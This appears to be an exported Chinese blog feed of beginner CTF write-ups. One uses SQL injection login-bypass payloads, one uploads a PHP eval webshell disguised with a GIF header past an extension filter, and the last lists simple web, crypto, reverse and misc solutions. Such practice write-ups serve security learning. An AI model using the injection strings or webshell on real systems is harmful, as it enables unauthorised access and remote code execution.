<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203193005388.png" alt="image-20211203193005388"></p>
<p><strong>攻击类型：</strong></p>
<p><u>单字典（无论几个变量都是一个字典）<u></u></u></p>
<p>1.狙击手（Sniper）：如果选择多个变量，所选字典会先爆破一个变量，再爆破第二个变量（一个一个来），适用于知道账户或密码的情况。</p>
<p>2.破城槌（Battering ram）：无论选择过几个变量，此字典都会同时爆破（多个一起上，且变量值都一样），适用于账户密码相同的情况。</p>
<p><u>多字典（几个变量就用几个字典）<u></u></u></p>
<p>1.音叉（Pitchfork）：变量1与变量2一一对应进行，若两个字典行数不同，小字典测完即结束，适用于知道多个账号和与之匹配的密码。</p>
<p>2.集束炸弹（Cluster bomb）：一对多出，即变量1的每个变量都要和变量2匹配一遍，适用于账号密码都不知道的情况。</p>
<p>此处应选Sniper，并添加字典。</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203194636704.png" alt="image-20211203194636704"></p>
<p>开始爆破</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195307444.png" alt="image-20211203195307444"></p>
<p>结果不是723就是737，有两个不同的即736和726，尝试该结果</p>
<p>723</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195538959.png" alt="image-20211203195538959"></p>
<p>737</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195619481.png" alt="image-20211203195619481"></p>
<p>736</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195443399.png" alt="image-20211203195443399"></p>
<p>F12后什么也没有</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195923451.png" alt="image-20211203195923451"></p>
<p>726</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203195506430.png" alt="image-20211203195506430"></p>
<p>最后得出结果：你爆破你码呢？？？？？？？？？？？？？？？？？？？这是SQL，果断关闭Bp。</p>
<p>随便输入账户密码 并在账号前加  ‘  如图</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201213071.png" alt="image-20211203201213071"></p>
<p>进入后</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201229961.png" alt="image-20211203201229961"></p>
<p>谷歌翻译</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201303627.png" alt="image-20211203201303627"></p>
<p>尝试万能密码 <code>admin&#39; or &#39;1&#39;=&#39;1</code></p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201415048.png" alt="image-20211203201415048"></p>
<p>结果</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201442402.png" alt="image-20211203201442402"></p>
<p>不慌，用第二种，不去判断密码的正确性。<code>admin&#39; or 1=1 %23</code></p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201549920.png" alt="image-20211203201549920"></p>
<p>成功</p>
<p><img src="/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/image-20211203201607750.png" alt="image-20211203201607750"></p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019上传</title>
    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
    <content><![CDATA[<p>该题为上传木马题</p>
<p>进入题目后，上传一句话木马</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
<span id="more"></span>

<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
<p>得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
<p>上传失败</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
<p>上传后</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
<p>链接成功</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
<p>最后在根目录下得到flag</p>
<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
]]></content>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>第一次接触CTF</title>
    <url>/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-白给-amp-签到"><a href="#1-白给-amp-签到" class="headerlink" title="1.白给&amp;签到"></a>1.白给&amp;签到</h2><p>没什么可说的，直接复制粘贴。</p>
<h2 id="2-Welcome"><a href="#2-Welcome" class="headerlink" title="2.Welcome"></a>2.Welcome</h2><p>F12查看源代码，得到flag</p>
<span id="more"></span>

<h2 id="3-Get"><a href="#3-Get" class="headerlink" title="3.Get"></a>3.Get</h2><p>由代码知，只需令henu=flag即可输出flag，则在网址一栏添加/?henu=flag。</p>
<h2 id="4-Post"><a href="#4-Post" class="headerlink" title="4.Post"></a>4.Post</h2><p>利用hackbar post传参henu=fl@g即可得到flag</p>
<h2 id="5-easyphp-1"><a href="#5-easyphp-1" class="headerlink" title="5. easyphp_1"></a>5. easyphp_1</h2><p>此题涉及md5加密，根据常见md5加密，搜索s214587387a找到相应md5加密“PHP弱性处理0e开头md5哈希字符串缺陷/bug” 令henu=其中任意加密码，如s1885207154a得到flag</p>
<h2 id="6-全是假的"><a href="#6-全是假的" class="headerlink" title="6.全是假的"></a>6.全是假的</h2><p>通过F12找到，则直接进入/hint.php,多次刷新得到flllagggg.php 访问得知需要WebAC浏览器，启用bp修改浏览器并伪造Ip，但最终没有得到flag</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/6.png"></p>
<h2 id="7-Autumn"><a href="#7-Autumn" class="headerlink" title="7. Autumn"></a>7. Autumn</h2><p>网站提示要扫一扫，则打开御剑后台扫描工具，扫描后进入相应网站，提示flag不在这，最终没有得到flag</p>
<h2 id="8-easy-Cookie"><a href="#8-easy-Cookie" class="headerlink" title="8. easy_Cookie"></a>8. easy_Cookie</h2><p>通过Google插件查看cookie</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/8.png"></p>
<p>得知是一段密文，打开bp解密，先用url解密知%3D为=，改之，接着连用两次Base64解密得到flag</p>
<h2 id="9-艺术就是？"><a href="#9-艺术就是？" class="headerlink" title="9. 艺术就是？"></a>9. 艺术就是？</h2><p>由火影忍者中迪达拉（哈哈哈哈哈哈哈）知道艺术即为爆破，进去网站发现果然是爆破打开bp，又因为密码账户一样，则用battering ram进行攻击得到administrator，输入得到flag</p>
<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><p>关键词“一句话”，进入网址，看来需要用一句话木马通过蚁剑进入后台，提交木马txt用bp修改格式，上传成功，但最终没能用蚁剑连接上。</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-滴滴滴"><a href="#1-滴滴滴" class="headerlink" title="1.滴滴滴"></a>1.滴滴滴</h2><p>下载附件后，一看就是摩斯密码，根据摩斯密码得到flag</p>
<h2 id="2-每逢佳节"><a href="#2-每逢佳节" class="headerlink" title="2.每逢佳节"></a>2.每逢佳节</h2><p>一看末尾有=，尝试用bp中的base64解码，得到flag</p>
<h2 id="3-Bacon"><a href="#3-Bacon" class="headerlink" title="3.Bacon"></a>3.Bacon</h2><p>关键词“当铺”，“培根”即当铺密码和培根密码，根据当铺密码转换关系将字符转换为数字，进而利用ASCII码转换为字母形式，最后培根解密得到flag</p>
<h2 id="4-古典变奏"><a href="#4-古典变奏" class="headerlink" title="4.古典变奏"></a>4.古典变奏</h2><p>关键词“猪圈”“凯撒”“栅栏”，先用猪圈密码解密，然后用凯撒密码6，栅栏密码8解密得到flag</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="1-白给-连上就给flag"><a href="#1-白给-连上就给flag" class="headerlink" title="1. [白给] 连上就给flag"></a>1. [白给] 连上就给flag</h2><p>根据提示下载了ubuntu虚拟机并且安装了netcat 但nc 39.103.198.196 10008</p>
<p>然后输入指令ls -l 再输入cat flag.txt得到flag。</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/1.png" alt="img"></p>
<h2 id="2-白给-从后门进来"><a href="#2-白给-从后门进来" class="headerlink" title="2. [白给] 从后门进来"></a>2. [白给] 从后门进来</h2><p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/2.png" alt="img"></p>
<p>不知道咋办了。</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-easy-re"><a href="#1-easy-re" class="headerlink" title="1. easy_re"></a>1. easy_re</h2><p>根据要求，下载了ida，将exe拖入后得到</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/re1.png" alt="img"></p>
<p>尝试F5转换，最终得到flag。</p>
<h2 id="2-keypatch"><a href="#2-keypatch" class="headerlink" title="2.keypatch"></a>2.keypatch</h2><p>按提示下载安装keypatch（虽然我也不知道有啥用），打开程序后发现一直循环，然后将程序拖入到ida，找到关键函数</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/re2.png" alt="img"></p>
<p>将这里的50000改为1，然后运行程序，得到flag。</p>
<h2 id="3-re1"><a href="#3-re1" class="headerlink" title="3.re1"></a>3.re1</h2><p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/re3.1.png" alt="img"></p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/re3.png" alt="img"></p>
<p>哈哈哈哈哈哈，啊这~，就不用我说了吧。</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-小兔子"><a href="#1-小兔子" class="headerlink" title="1.小兔子"></a>1.小兔子</h2><p>下载图片后，右键查看属性，得到一串密文，尝试搜索兔子加密，得知有rabbit解密，通过解密得到flag</p>
<h2 id="2-我在城楼观山景"><a href="#2-我在城楼观山景" class="headerlink" title="2.我在城楼观山景"></a>2.我在城楼观山景</h2><p>下载文档后发现是乱码，尝试搜索前几行字符</p>
<p><img src="/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/misc2.png" alt="img"></p>
<p>得知该为图片转为txt会出现的乱码，将后缀改为jpg打开图片后，发现左下角的falg</p>
<h2 id="3-如来の兽"><a href="#3-如来の兽" class="headerlink" title="3. 如来の兽"></a>3. 如来の兽</h2><p>根据题目可知，该题涉及佛曰和兽音解密，经过两次解密后，发现仍有密文，尝试搜索社会主义核心价值观解密，得知真有此加密方法，解密得到flag</p>
<h2 id="4-PDF"><a href="#4-PDF" class="headerlink" title="4.PDF"></a>4.PDF</h2><p>提示在图片下面，我们便将PDF转为word文档，得到一串极具讽刺意味的话语，尝试复制搜索，得到该为阴阳怪气加密，解密得到flag</p>
<h2 id="5-QRcode"><a href="#5-QRcode" class="headerlink" title="5. QRcode"></a>5. QRcode</h2><p>打开后发现二维码残缺，补全后扫描得到一串密文，尝试搜索密文，得知有brainfuck加密方式，输入密文，解密得到flag</p>
<h2 id="6-Boringboss"><a href="#6-Boringboss" class="headerlink" title="6.Boringboss"></a>6.Boringboss</h2><p>打开后发现这明显是当铺密码，解密后得到对应数字，利用ASCII码转换为对应字母，接着用培根密码解密得到flag</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
